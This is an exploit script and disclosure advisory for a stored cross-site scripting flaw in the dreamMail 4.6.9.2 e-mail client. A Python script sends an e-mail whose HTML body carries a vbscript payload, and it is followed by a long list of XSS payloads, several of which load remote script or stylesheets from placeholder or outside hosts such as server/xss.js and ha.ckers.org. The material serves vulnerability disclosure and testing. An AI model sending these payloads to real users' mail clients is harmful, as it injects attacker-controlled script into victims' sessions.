#!/usr/bin/python
'''
 
Author: loneferret of Offensive Security
Product: dreamMail e-mail client
Version: 4.6.9.2
Vendor Site: http://www.dreammail.eu
Software Download: http://www.dreammail.eu/intl/en/download.html
 
Tested on: Windows XP SP3 Eng.
Tested on: Windows 7 Pro SP1 Eng.
dreamMail: Using default settings
 
 
E-mail client is vulnerable to stored XSS. Either opening or viewing the e-mail and you
get an annoying alert box etc etc etc.
Injection Point: Body
  
Gave vendor 7 days to reply in order to co-ordinate a release date.
Timeline:
16 Aug 2013: Tentative release date 23 Aug 2013
16 Aug 2013: Vulnerability reported to vendor. Provided complete list of payloads.
19 Aug 2013: Still no response. Sent second e-mail.
22 Aug 2013: Got a reply but not from development guy. He seems MIA according to contact.
             No longer supported due to missing development guy.
23 Aug 2013: Still nothing.
24 Aug 2013: Release
 
'''
 
import smtplib, urllib2
 
payload = '''<IMG SRC='vbscript:msgbox("XSS")'>'''
 
def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@offsec.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS payload\n"
        msg += "Content-type: text/html\n\n"
        msg += payload + "\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()
 
username = "acker@offsec.local"
password = "123456"
dstemail = "victim@offsec.local"
frmemail = "acker@offsec.local"
smtpsrv  = "xxx.xxx.xxx.xxx"
 
print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)
 
'''
List of XSS types and different syntaxes to which the client is vulnerable.
Each payload will pop a message box, usually with the message "XSS" inside.
 
 
Paylaod-: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
 
Paylaod-: <SCRIPT SRC=http://server/xss.js></SCRIPT>
 
Paylaod-: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 
Paylaod-: <BODY BACKGROUND="javascript:alert('XSS');">
 
Paylaod-: <BODY ONLOAD=alert('XSS')>
 
Paylaod-: <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 
Paylaod-: <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 
Paylaod-: <DIV STYLE="width: expression(alert('XSS'));">
 
Paylaod-: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 
Paylaod-: <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
 
Paylaod-: <IMG SRC="javascript:alert('XSS');">
 
Paylaod-: <IMG SRC=javascript:alert('XSS')>
 
Paylaod-: <IMG DYNSRC="javascript:alert('XSS');">
 
Paylaod-: <IMG LOWSRC="javascript:alert('XSS');">Paylaod-: 21exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
 
Paylaod-: <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
 
Paylaod-: <IMG SRC='vbscript:msgbox("XSS")'>
 
Paylaod-: <OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
 
Paylaod-: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
 
Paylaod-: <XSS STYLE="xss:expression(alert('XSS'))">
 
Paylaod-: <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
 
Paylaod-: <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
 
Paylaod-: <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 
Paylaod-: <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
 
Paylaod-: <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
 
Paylaod-: <TABLE BACKGROUND="javascript:alert('XSS')"></TABLE>
 
Paylaod-: <TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE>
 
Paylaod-: <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
 
Paylaod-: <XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 
Paylaod-: <HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
 
Paylaod-: <!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
 
Paylaod-: <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
 
Paylaod-: <IMG SRC=JaVaScRiPt:alert('XSS')>
 
Paylaod-: <IMG SRC=javascript:alert("XSS")>
 
Paylaod-: <IMG SRC=`javascript:alert("We says, 'XSS'")`>
 
Paylaod-: <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 
Paylaod-: <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 
Paylaod-: <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 
Paylaod-: <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 
Paylaod-: <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 
Paylaod-: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
 
Paylaod-: <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 
Paylaod-: <IMG SRC="jav  ascript:alert('XSS');">
 
Paylaod-: <IMG SRC="jav&#x09;ascript:alert('XSS');">
 
Paylaod-: <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 
Paylaod-: <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 
Paylaod-: <IMG SRC=" &#14;  javascript:alert('XSS');">
 
Paylaod-: <SCRIPT/XSS SRC="http://server/xss.js"></SCRIPT>
 
Paylaod-: <SCRIPT SRC=http://server/xss.js
 
Paylaod-: <IMG SRC="javascript:alert('XSS')"
 
Paylaod-: <<SCRIPT>alert("XSS");//<</SCRIPT>
 
Paylaod-: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 
Paylaod-: <SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
 
Paylaod-: <SCRIPT a=">" SRC="http://server/xss.js"></SCRIPT>
 
Paylaod-: <SCRIPT ="blah" SRC="http://server/xss.js"></SCRIPT>
 
Paylaod-: <SCRIPT a="blah" '' SRC="http://server/xss.js"></SCRIPT>
 
Paylaod-: <SCRIPT "a='>'" SRC="http://server/xss.js"></SCRIPT>
 
Paylaod-: <SCRIPT a=`>` SRC="http://server/xss.js"></SCRIPT>
 
Paylaod-: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://server/xss.js"></SCRIPT>
 
Paylaod-: <SCRIPT a=">'>" SRC="http://server/xss.js"></SCRIPT>
